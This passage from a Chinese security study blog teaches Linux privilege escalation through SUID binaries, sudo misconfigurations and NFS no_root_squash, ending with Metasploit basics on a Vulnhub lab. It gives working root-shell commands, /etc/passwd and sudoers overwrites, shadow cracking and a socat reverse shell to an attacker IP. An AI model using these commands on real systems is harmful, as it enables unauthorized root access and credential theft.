<p>第一个要弱类型为<code>0</code></p>
<p>第二个要不为<code>0</code>才能执行真的判断</p>
<p>第三个要求其为数字</p>
</blockquote>
<p>就可以用类似<code>0e2</code>，绕过这三个</p>
<h1 id="5-特殊权限位"><a href="#5-特殊权限位" class="headerlink" title="5.特殊权限位"></a>5.特殊权限位</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjcxMjkyOA==&mid=2247484922&idx=1&sn=ba666d73dc1ed57385eda7210afca433&chksm=9baceb75acdb62634d94269e2052f2856bcebac7e1b0962f30132cbda7494813ae6ad2c0f88c&mpshare=1&scene=23&srcid=0830y3hzCRRlcsleoKEyGZr8&sharer_sharetime=1661831991788&sharer_shareid=30776e1834041fdca5e0b68533a2427e#rd">参考文章</a></p>
<h2 id="1）利用SUID提权"><a href="#1）利用SUID提权" class="headerlink" title="1）利用SUID提权"></a>1）利用SUID提权</h2><h3 id="什么是suid？"><a href="#什么是suid？" class="headerlink" title="什么是suid？"></a>什么是suid？</h3><blockquote>
<p>Set User   ID的一种权限类型，允许用户使用指定的用户权限执行文件。那些具用suid权限的文件以最高的权限运行。假设我们以非root用户身份访问目标系统，并且我们发现二进制文件启用了suid位，那么<br>这些文件&#x2F;程序&#x2F;命令可以以root权限运行</p>
<p>SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限的资源</p>
</blockquote>
<h3 id="什么是SGID"><a href="#什么是SGID" class="headerlink" title="什么是SGID"></a>什么是SGID</h3><blockquote>
<p>G的意思就是<code>group</code>，功能和<code>suid</code>基本不相同，唯一区别就是<code>suid</code>获得命令所属用户的身份和权限，而<code>sgid</code>是获取所属用户组的身份和权限</p>
</blockquote>
<h3 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h3><blockquote>
<p>1，SUID权限只能设置二进制文件。</p>
<p>2，命令执行者要有二进制文件的执行权。</p>
<p>3，命令执行者执行二进制文件时会获得该程序的属主身份。</p>
<p>4，SUID权限只在程序执行过程中有效。</p>
<p>即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。</p>
</blockquote>
<hr>
<h3 id="关键"><a href="#关键" class="headerlink" title="*关键"></a>*关键</h3><p>1.查看具有<code>root</code>用户权限的<code>SUID</code>二进制可执行文件</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">命令来查找拥有SUID权限的程序。</span><br><span class="line"></span><br><span class="line">perm指定权限，<span class="attribute">-u</span>=s代表SUID权限，type指定文件类型，f表示常规文件</span><br></pre></td></tr></table></figure>

<p>2.已知的可用来提权的<code>linux</code>可执行的文件列表如下</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">Nmap、Vim、<span class="built_in">find</span>、Bash、<span class="built_in">More</span>、Less、Nano、cp</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="（1）利用find获取root权限shell"><a href="#（1）利用find获取root权限shell" class="headerlink" title="（1）利用find获取root权限shell"></a>（1）利用find获取root权限shell</h4><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">find</span> <span class="regexp">/ -name filename -exec “/</span>bin/sh” \;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个filename，只要存在就行，目的是让find命令可以成功执行，后面的-exec就是加上命令</p>
<p>这里find有suid权限，普通用户执行时，会变成root用户，执行&#x2F;bin&#x2F;sh命令时，会进入root用户，从而实现提权</p>
<p>如果find没有suid权限，执行&#x2F;bin&#x2F;sh命令后，仍然是普通用户</p>
<p>·&#x2F;为根目录<br>·-name 按文件名查找<br>·-exec 对匹配对象执行的命令，以;结束<br>但是（;）是特殊字符，需要用（\）转义</p>
</blockquote>
<h4 id="（2）利用cp获取root权限shell"><a href="#（2）利用cp获取root权限shell" class="headerlink" title="（2）利用cp获取root权限shell"></a>（2）利用cp获取root权限shell</h4><blockquote>
<p>以cp为例，这里给cp添加SUID权限做测试，拥有SUID权限的程序会有rwx变成rws。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220830133409844.png" alt="image-20220830133409844"></p>
<p>可以通过</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>命令来查找拥有SUID权限的程序。</p>
<p><img src="/2022/05/31/daily/image-20220830133446426.png" alt="image-20220830133446426"></p>
<blockquote>
<p>当普通用户运行cp命令时，此时的cp权限就为root，利用时，可以cp把&#x2F;etc&#x2F;passwd复制到桌面，然后进行修改。</p>
<p>首先用openssl生成一个密码。passwd参数代表生成一个密码，-1为md5，-salt指定盐（随意指定），最后跟要加密的值，也就是密码abcd</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220830133504874.png" alt="image-20220830133504874"></p>
<blockquote>
<p>然后按照etc&#x2F;passwd的格式添加一个新用户，权限按root的写即可。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220830133645874.png" alt="image-20220830133645874"></p>
<blockquote>
<p>添加后我们用cp再把文件复制回去进行替换，此时就添加了一个abcd用户，权限为root。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220830133656254.png" alt="image-20220830133656254"></p>
<h4 id="（3）利用Vim获取root权限shell"><a href="#（3）利用Vim获取root权限shell" class="headerlink" title="（3）利用Vim获取root权限shell"></a>（3）利用Vim获取root权限shell</h4><blockquote>
<p>vim在有SUID权限的情况下，也可用来进行提权操作。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220830134124700.png" alt="image-20220830134124700"></p>
<blockquote>
<p>当vim被赋予suid权限后，意味着任何用户都可以使用vim命令来编辑那些只能由root编辑的文件，例如通过vim来编辑etc&#x2F;sudoers文件（普通用户会被直接拒绝访问），在sudoers文件中配置普通用户的权限，权限和root一样，这里以test用户为例，添加如下内容：</p>
</blockquote>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">test   </span>ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<blockquote>
<p>vim编辑后保存时用wq!强制保存，vim运行时虽然是root权限，但wq依然会提示只读。</p>
<p>随后sudo bash就会获取一个root的shell。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220830134159252.png" alt="image-20220830134159252"></p>
<h4 id="（4）利用nmap获取root权限shell"><a href="#（4）利用nmap获取root权限shell" class="headerlink" title="（4）利用nmap获取root权限shell"></a>（4）利用nmap获取root权限shell</h4><h5 id="1-旧版"><a href="#1-旧版" class="headerlink" title="1.旧版"></a>1.旧版</h5><blockquote>
<p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
</blockquote>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>

<p>之后执行:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure>

<p>msf中的模块为：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">exploit<span class="regexp">/unix/</span>local/setuid_nmap</span><br></pre></td></tr></table></figure>

<h5 id="2-新版"><a href="#2-新版" class="headerlink" title="2.新版"></a>2.新版</h5><blockquote>
<p>较新版可使用 <code>--script</code> 参数：</p>
</blockquote>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">先写入一条命令</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br><span class="line">再<span class="params">--script</span>参数，执行</span><br><span class="line">sudo nmap <span class="params">--script=getshell</span></span><br></pre></td></tr></table></figure>

<p>成功提权</p>
<p><img src="/2022/05/31/daily/image-20221011132253611.png" alt="image-20221011132253611"></p>
<h4 id="（5）利用脚本获取root权限shell"><a href="#（5）利用脚本获取root权限shell" class="headerlink" title="（5）利用脚本获取root权限shell"></a>（5）利用脚本获取root权限shell</h4><blockquote>
<p>除了系统的一些可执行命令，自己写的可执行文件也可添加SUID权限。不论c或者go或者其他语言都可以，这里以c为例。</p>
</blockquote>
<p>示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用gcc进行编译。</p>
<p><img src="/2022/05/31/daily/image-20220830134227202.png" alt="image-20220830134227202"></p>
<p>编译后传入目标机，这里放到bin&#x2F;aaa目录下，然后添加SUID权限测试。</p>
<p><img src="/2022/05/31/daily/image-20220830134236889.png" alt="image-20220830134236889"></p>
<p>普通用户执行该文件后，会返回一个root权限的shell。</p>
<p><img src="/2022/05/31/daily/image-20220830134252824.png" alt="image-20220830134252824"></p>
<h2 id="2）利用SUDO提权"><a href="#2）利用SUDO提权" class="headerlink" title="2）利用SUDO提权"></a>2）利用SUDO提权</h2><h3 id="sudo和su的区别"><a href="#sudo和su的区别" class="headerlink" title="sudo和su的区别"></a><strong>sudo和su的区别</strong></h3><blockquote>
<p>1，sudo是以root权限去运行一个命令，su是去切换用户的身份。</p>
<p>2，sudo只要知道自己的密码即可，su需要知道被切换用户的密码。</p>
</blockquote>
<h3 id="sudoers文件"><a href="#sudoers文件" class="headerlink" title="sudoers文件"></a><strong>sudoers文件</strong></h3><blockquote>
<p>&#x2F;etc&#x2F;sudoers文件，是sudo权限的配置文件。当使用sudo接命令时，linux系统会在sudoers文件中查找当前用户，根据当前用户权限配置来决定是否可以运行相关命令。</p>
</blockquote>
<p>例如添加test用户的相关配置：</p>
<p><img src="/2022/05/31/daily/image-20220901223741370.png" alt="image-20220901223741370"></p>
<p>格式如下：</p>
<p><img src="/2022/05/31/daily/image-20220901223808981.png" alt="image-20220901223808981"></p>
<h3 id="sudo-su-amp-amp-sudo-bash"><a href="#sudo-su-amp-amp-sudo-bash" class="headerlink" title="sudo su &amp;&amp; sudo bash"></a><strong>sudo su &amp;&amp; sudo bash</strong></h3><blockquote>
<p>当没有对普通用户做严格的限制时，或者配置权限过大时，则可以尝试sudo su来切换到root权限。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901223824172.png" alt="image-20220901223824172"></p>
<blockquote>
<p>或者执行sudo bash。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901223837242.png" alt="image-20220901223837242"></p>
<blockquote>
<p>当visudo命令不能用时，限制了部分命令，则可以尝试下vim是否被禁用，sudo vim也可以编辑sudoers文件，且wq!可以成功保存。</p>
</blockquote>
<h4 id="SUDO-dd-提权法"><a href="#SUDO-dd-提权法" class="headerlink" title="*SUDO -dd 提权法"></a>*SUDO -dd 提权法</h4><p><a href="https://www.cnblogs.com/zlgxzswjy/p/12746160.html">原文</a>            </p>
<blockquote>
<p>当用户可以通过sudo执行dd命令时，可以被用来提权。通过dd命令覆盖原始&#x2F;etc&#x2F;passwd文件，以达到修改密码的目的</p>
</blockquote>
<p>1、创建一个已知密码的hash，以备替换时使用</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/etc</span><span class="variable">$ </span>openssl passwd <span class="number">-1</span> -salt <span class="number">123</span> password </span><br><span class="line"><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="title class_">KRa5a</span>.</span><br></pre></td></tr></table></figure>

<p>2、备份原始passwd文件，以防修改错误时无法访问</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># cp <span class="regexp">/etc/</span>passwd <span class="regexp">/tmp/</span>passwd</span><br></pre></td></tr></table></figure>

<p>3、利用第一步里生成的hash构建新的passwd hash条目</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment"># cat passwd</span></span><br><span class="line"><span class="symbol">root:</span><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="symbol">KRa5a.:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>4、使用dd覆盖原始passwd文件</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hh</span>@hh:/tmp$ cat passwd|sudo dd of=/etc/passwd </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records in </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records out</span><br><span class="line"><span class="attribute">1757</span> bytes (<span class="number">1</span>.<span class="number">8</span> kB, <span class="number">1</span>.<span class="number">7</span> KiB) copied, <span class="number">0</span>.<span class="number">000397129</span> s, <span class="number">4</span>.<span class="number">4</span> MB/s</span><br></pre></td></tr></table></figure>

<p>5、使用刚才创建hash时使用的密码进行登录</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="variable">$su</span> root</span><br><span class="line"><span class="symbol">Password:</span></span><br><span class="line">root<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>提权成功！</p>
<h4 id="GIT"><a href="#GIT" class="headerlink" title="*GIT"></a>*GIT</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入sudo -l</span><br><span class="line"><span class="regexp">//</span>列出目前用户可执行与无法执行的指令。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220901112624228.png" alt="image-20220901112624228"></p>
<p><strong><u>就可以发现<code>root</code>以<code>nopasswd</code>【不需要密码】运行git命令</u></strong></p>
<p>原理是git存在缓存区溢出漏洞，</p>
<p>在使用</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>不需要输入root密码，即可以root身份执行这条命令</p>
<p>操作如下</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo git -p     </span><br><span class="line"><span class="regexp">//</span>-p是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令</span><br></pre></td></tr></table></figure>

<p>下面可以看看区别</p>
<h5 id="注意"><a href="#注意" class="headerlink" title="*注意"></a>*注意</h5><h6 id="1-窗口足够大"><a href="#1-窗口足够大" class="headerlink" title="1.窗口足够大"></a>1.窗口足够大</h6><p><img src="/2022/05/31/daily/image-20220901113721300.png" alt="image-20220901113721300"></p>
<p>可以看到显示完了，就有回到原处了</p>
<h6 id="2-窗口小一些"><a href="#2-窗口小一些" class="headerlink" title="2.窗口小一些"></a>2.窗口小一些</h6><p><img src="/2022/05/31/daily/image-20220901113851826.png" alt="image-20220901113851826"></p>
<p>下方就显示出:，等待输入</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">**:是自带有的，不是输入的</span><br><span class="line">:!/bin/sh    //感叹号!是shell转义字符，所以要避免sudo授权用户使用vi，vim，ftp，lee，more，git</span><br><span class="line">进入root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">当然也可以执行:!passwd root</span><br><span class="line">修改其密码</span><br><span class="line">然后su root登录也可</span><br></pre></td></tr></table></figure>

<h5 id="1-执行命令，拿到root的shell"><a href="#1-执行命令，拿到root的shell" class="headerlink" title="1.执行命令，拿到root的shell"></a>1.执行命令，拿到root的shell</h5><p><code>$</code>变成<code>#</code>成功</p>
<p><img src="/2022/05/31/daily/image-20220901114902493.png" alt="image-20220901114902493"></p>
<h5 id="2-修改密码，登录"><a href="#2-修改密码，登录" class="headerlink" title="2.修改密码，登录"></a>2.修改密码，登录</h5><p><img src="/2022/05/31/daily/image-20220901114453769.png" alt="image-20220901114453769"></p>
<p><code>$</code>变成<code>#</code>，成功登录</p>
<p><img src="/2022/05/31/daily/image-20220901114726423.png" alt="image-20220901114726423"></p>
<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a><strong>其他命令</strong></h4><p>也有很多其他命令可以用来提权，和之前的SUID提权中说的命令类似，例如sudo允许find命令，则可以通过exec参数来切换到root权限。</p>
<p>这里添加新用户aaa，并修改sudoers文件，允许部分命令，内容如下。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">aaa  ALL=(ALL:ALL) <span class="regexp">/usr/</span>bin<span class="regexp">/find,/u</span>sr<span class="regexp">/bin/</span>perl,<span class="regexp">/usr/</span>bin<span class="regexp">/python3,/u</span>sr<span class="regexp">/bin/</span>less,<span class="regexp">/usr/</span>bin<span class="regexp">/awk,/u</span>sr<span class="regexp">/bin/m</span>an,<span class="regexp">/usr/</span>bin/vi</span><br></pre></td></tr></table></figure>

<p>这时aaa用户使用sudo就只能执行配置好的命令，sudo su和sudo bash被禁止执行。</p>
<p><img src="/2022/05/31/daily/image-20220901224325691.png" alt="image-20220901224325691"></p>
<p>相关命令提权方式如下：</p>
<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><blockquote>
<p><code>exec</code>参数用来指定搜索结果的处理命令，需要以分号结尾，分号在命令行有特殊函数，要用<code>\</code>进行转义。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901224342169.png" alt="image-20220901224342169"></p>
<h5 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h5><blockquote>
<p><code>e</code>参数用来指定要运行的命令，然后使用<code>linux</code>的<code>exec</code>参数来调用<code>bash</code>。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901224356163.png" alt="image-20220901224356163"></p>
<h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><blockquote>
<p><code>c</code>参数可以在命令行执行<code>python</code>代码，<code>pty</code>库是一个伪终端库，它的<code>spawn</code>会调用指定的程序。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901224409127.png" alt="image-20220901224409127"></p>
<h5 id="less"><a href="#less" class="headerlink" title="less"></a>less</h5><blockquote>
<p>输入<code>sudo less /etc/hosts</code>命令浏览文件内容时，到底部输入<code>!bash</code>后回车，会获得一个<code>root</code>权限的<code>shell</code>。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901224420552.png" alt="image-20220901224420552"></p>
<p><img src="/2022/05/31/daily/image-20220901224511943.png" alt="image-20220901224511943"></p>
<h5 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h5><blockquote>
<p>通过调用linux的system函数来打开bash。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901224431624.png" alt="image-20220901224431624"></p>
<h5 id="man"><a href="#man" class="headerlink" title="man"></a>man</h5><blockquote>
<p>通过sudo man man命令来打开man的使用手册，同时会进入编辑行，输入!bash回车，可获取root权限。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901224541655.png" alt="image-20220901224541655"></p>
<p><img src="/2022/05/31/daily/image-20220901224551402.png" alt="image-20220901224551402"></p>
<h5 id="vi"><a href="#vi" class="headerlink" title="*vi"></a>*vi</h5><blockquote>
<p><code>sudo vi</code>会进入vi默认页，输入<code>:!bash</code>回车，可进入<code>root</code>命令行。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901224609706.png" alt="image-20220901224609706"></p>
<p><img src="/2022/05/31/daily/image-20220901224622369.png" alt="image-20220901224622369"></p>
<h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><blockquote>
<p>如果sudoers定义了可以执行某个脚本，则我们可以把返回shell的代码添加进去。</p>
</blockquote>
<p>例如桌面有个运维需要的aaa.sh文件，我们添加一段打开bash的代码，然后sudo运行即可。</p>
<p><img src="/2022/05/31/daily/image-20220901224639423.png" alt="image-20220901224639423"></p>
<p>参考代码：</p>
<p><img src="/2022/05/31/daily/image-20220901224909264.png" alt="image-20220901224909264"></p>
<h4 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a><strong>应用程序</strong></h4><blockquote>
<p>除了上面的一些二进制文件，一些应用程序也可以获取root权限，例如env、ftp、socat、scp。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901225004858.png" alt="image-20220901225004858"></p>
<h5 id="env"><a href="#env" class="headerlink" title="env"></a>env</h5><blockquote>
<p>通过env环境变量来获取root权限。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901225022285.png" alt="image-20220901225022285"></p>
<h5 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h5><blockquote>
<p>通过ftp来进入bash获取root权限。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901225031965.png" alt="image-20220901225031965"></p>
<h5 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h5><blockquote>
<p>通过socat客户端连接攻击机，攻击机可获得rootshell。先执行服务端，后执行客户端。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo socat <span class="built_in">exec</span>:<span class="string">&#x27;sh -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">攻击机执行：</span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220901225047468.png" alt="image-20220901225047468"></p>
<p><img src="/2022/05/31/daily/image-20220901225056003.png" alt="image-20220901225056003"></p>
<h5 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h5><blockquote>
<p>还有一个scp，scp是一个安全复制文件的命令，它无法获取一个shell，但可以用来复制一些系统的敏感文件。例如etc&#x2F;passwd、etc&#x2F;shadow等。</p>
<p>如下命令，将passwd文件传输到指定机器的root&#x2F;Desktop下，然后再对密码进行破解等操作。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901225110501.png" alt="image-20220901225110501"></p>
<h4 id="黑名单情况"><a href="#黑名单情况" class="headerlink" title="黑名单情况"></a><strong>黑名单情况</strong></h4><blockquote>
<p>如果碰到sudoers文件使用黑名单的情况，比如说权限禁用sudo使用find命令，但是都是在ALL基础上设置的，那么可以cp把find复制到其它目录运行。</p>
</blockquote>
<p><img src="/2022/05/31/daily/image-20220901225127772.png" alt="image-20220901225127772"></p>
<h2 id="3-NFS配置不当导致提权"><a href="#3-NFS配置不当导致提权" class="headerlink" title="3) NFS配置不当导致提权"></a>3) NFS配置不当导致提权</h2><h3 id="NFS介绍"><a href="#NFS介绍" class="headerlink" title="NFS介绍"></a>NFS介绍</h3><blockquote>
<p>NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。</p>
</blockquote>
<p>这里以ubuntu为例，简单配置一下：</p>
<p>首先安装nfs服务端：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install nfs-kernel-<span class="keyword">server</span></span><br></pre></td></tr></table></figure>

<p>安装后修改配置文件&#x2F;etc&#x2F;exports，这里将home目录进行挂载共享，内容如下：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">/home *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>

<p>其中&#x2F;home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。</p>
<p>随后重启相关服务：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># nfs通过rpc通信，这里把rpcbind也重启下sudo <span class="regexp">/etc/i</span>nit.d<span class="regexp">/rpcbind restartsudo /</span>etc<span class="regexp">/init.d/</span>nfs-kernel-server restart</span><br></pre></td></tr></table></figure>

<p>此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。</p>
<p><img src="/2022/05/31/daily/image-20220901231323392.png" alt="image-20220901231323392"></p>
<p>或者通过nmap的相关脚本来进行扫描。</p>
<p><img src="/2022/05/31/daily/image-20220901231334381.png" alt="image-20220901231334381"></p>
<h3 id="NFS配置不当可提权"><a href="#NFS配置不当可提权" class="headerlink" title="NFS配置不当可提权"></a><strong>NFS配置不当可提权</strong></h3><blockquote>
<p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。</p>
</blockquote>
<p>测试如下：</p>
<p>首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图。</p>
<p><img src="/2022/05/31/daily/image-20220901231351979.png" alt="image-20220901231351979"></p>
<p>此时目标机的home目录下就会有一个具有suid权限的bash。</p>
<p>普通用户执行即可获取root权限，这里注意需要加上<code>p</code>参数，否则权限还是当前用户的。</p>
<p><code>p</code>参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承<code>suid</code>，因为bash有<code>suid</code>权限，所以这里是root。</p>
<p><img src="/2022/05/31/daily/image-20220901231410196.png" alt="image-20220901231410196"></p>
<p>使用场景：这个和<code>suid</code>提权很像，给程序赋予<code>suid</code>权限然后利用。不同的是前两篇<code>suid</code>提权是当前用户使用<code>sudo  chmod</code>自己修改的，在<code>sudoers</code>禁用<code>sudo</code>命令等情况下，就行不通了。而<code>nfs</code>配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。</p>
<p>同理，之前总结的<code>suid</code>提权的那些程序也同样适用，这里就不再记了。</p>
<h3 id="其它命令"><a href="#其它命令" class="headerlink" title="其它命令"></a><strong>其它命令</strong></h3><p>除了可以直接得到<code>shell</code>的，还有其他一些程序不能直接获取，例如<code>nano、vi</code>等。</p>
<p><img src="/2022/05/31/daily/image-20220901231423093.png" alt="image-20220901231423093"></p>
<p>然后使用<code>nano -p</code>来读取<code>shadow</code>文件，这里读取时把相关记录复制出来，使用<code>john</code>破解，测试不能重定向，需要权限，所以只能复制。</p>
<p><img src="/2022/05/31/daily/image-20220901231435125.png" alt="image-20220901231435125"></p>
<p>复制后使用<code>john</code>破解获取相关用户密码，以<code>root</code>为例，密码是<code>root</code>。</p>
<p><img src="/2022/05/31/daily/image-20220901231451129.png" alt="image-20220901231451129"></p>
<p>如果密码太复杂，破解不了，则可以尝试其它用户，例如我这里目标机是<code>aaa</code>用户，破解<code>aaa</code>密码为<code>aaa</code>。</p>
<p><img src="/2022/05/31/daily/image-20220901231505353.png" alt="image-20220901231505353"></p>
<p>这时候不确定<code>aaa</code>是否为<code>root</code>权限，则可以继续使用<code>nano</code>去编辑<code>passwd</code>文件，给<code>aaa</code>赋权。</p>
<p>把原来的<code>1001</code>换成<code>0</code>.</p>
<p><img src="/2022/05/31/daily/image-20220901231516388.png" alt="image-20220901231516388"></p>
<p>然后切换<code>aaa</code>用户即可。</p>
<p><img src="/2022/05/31/daily/image-20220901231524654.png" alt="image-20220901231524654"></p>
<p>利用这种机制，也可以用来修改<code>sudoers</code>文件，添加或修改为以下内容。</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">aaa     <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) NOPASSWD:<span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>

<p>然后使用<code>sudo bash</code>或<code>sudo su</code>获取<code>root</code>权限。</p>
<p><img src="/2022/05/31/daily/image-20220901231537204.png" alt="image-20220901231537204"></p>
<hr>
<h1 id="6-一些kali工具的使用"><a href="#6-一些kali工具的使用" class="headerlink" title="6.一些kali工具的使用"></a>6.一些kali工具的使用</h1><h2 id="1）msf"><a href="#1）msf" class="headerlink" title="1）msf"></a>1）msf</h2><h3 id="（1）msf基本使用"><a href="#（1）msf基本使用" class="headerlink" title="（1）msf基本使用"></a>（1）msf基本使用</h3><p><code>一个漏洞利用框架,对计算机软件漏洞进行攻击</code></p>
<p><strong>这里以vulnhub dc1为例</strong></p>
<p>终端输入<code>msfconsole</code>，进入msf界面，或者菜单也可以打开</p>
<p><img src="/2022/05/31/daily/image-20220830094506049.png" alt="image-20220830094506049"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入search drupal，找一下有没有drupal可以利用的脚本</span><br><span class="line"><span class="regexp">/*对于其他命令，可以用help查询*/</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830094939297.png" alt="image-20220830094939297"></p>
<p>这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">use</span> <span class="number">1</span>，进入编号<span class="number">1</span>脚本的运行环境</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830095106784.png" alt="image-20220830095106784"></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">show</span> <span class="keyword">options</span>,查看脚本运行的所需要配置的项目</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20220830105519336.png" alt="image-20220830105519336"></p>
